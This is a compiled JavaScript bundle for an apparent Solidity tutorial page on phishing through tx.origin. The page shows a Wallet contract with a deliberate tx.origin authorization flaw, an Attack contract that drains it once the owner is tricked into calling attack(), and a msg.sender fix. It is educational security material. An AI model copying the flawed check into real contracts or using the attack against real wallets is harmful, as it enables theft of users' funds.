"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[6276],{3905:function(e,t,n){n.d(t,{Zo:function(){return d},kt:function(){return f}});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var c=r.createContext({}),s=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},d=function(e){var t=s(e.components);return r.createElement(c.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},p=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,a=e.originalType,c=e.parentName,d=l(e,["components","mdxType","originalType","parentName"]),p=s(n),f=i,h=p["".concat(c,".").concat(f)]||p[f]||u[f]||a;return n?r.createElement(h,o(o({ref:t},d),{},{components:n})):r.createElement(h,o({ref:t},d))}));function f(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var a=n.length,o=new Array(a);o[0]=p;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l.mdxType="string"==typeof e?e:i,o[1]=l;for(var s=2;s<a;s++)o[s]=n[s];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}p.displayName="MDXCreateElement"},6194:function(e,t,n){n.r(t),n.d(t,{contentTitle:function(){return c},default:function(){return p},frontMatter:function(){return l},metadata:function(){return s},toc:function(){return d}});var r=n(7462),i=n(3366),a=(n(7294),n(3905)),o=["components"],l={title:"Phishing with tx.origin",version:"0.8.10",description:"An example of phishing with tx.origin in Solidity"},c=void 0,s={unversionedId:"solidity/example/TxOrigin",id:"solidity/example/TxOrigin",isDocsHomePage:!1,title:"Phishing with tx.origin",description:"An example of phishing with tx.origin in Solidity",source:"@site/docs/solidity/example/TxOrigin.md",sourceDirName:"solidity/example",slug:"/solidity/example/TxOrigin",permalink:"/rooctblog/docs/solidity/example/TxOrigin",tags:[],version:"current",frontMatter:{title:"Phishing with tx.origin",version:"0.8.10",description:"An example of phishing with tx.origin in Solidity"},sidebar:"docs",previous:{title:"Try Catch",permalink:"/rooctblog/docs/solidity/example/TryCatch"},next:{title:"Variables",permalink:"/rooctblog/docs/solidity/example/Variables"}},d=[{value:"What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?",id:"whats-the-difference-between-msgsender-and-txorigin",children:[]},{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],u={toc:d};function p(e){var t=e.components,n=(0,i.Z)(e,o);return(0,a.kt)("wrapper",(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h3",{id:"whats-the-difference-between-msgsender-and-txorigin"},"What's the difference between ",(0,a.kt)("inlineCode",{parentName:"h3"},"msg.sender")," and ",(0,a.kt)("inlineCode",{parentName:"h3"},"tx.origin"),"?"),(0,a.kt)("p",null,"If contract A calls B, and B calls C, in C ",(0,a.kt)("inlineCode",{parentName:"p"},"msg.sender")," is B and ",(0,a.kt)("inlineCode",{parentName:"p"},"tx.origin")," is A."),(0,a.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,a.kt)("p",null,"A malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n*/\n\n/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice's Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice's wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n\n")),(0,a.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,a.kt)("p",null,"Use ",(0,a.kt)("inlineCode",{parentName:"p"},"msg.sender")," instead of ",(0,a.kt)("inlineCode",{parentName:"p"},"tx.origin")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},'function transfer(address payable _to, uint256 _amount) public {\n  require(msg.sender == owner, "Not owner");\n\n  (bool sent, ) = _to.call.value(_amount)("");\n  require(sent, "Failed to send Ether");\n}\n\n')))}p.isMDXComponent=!0}}]);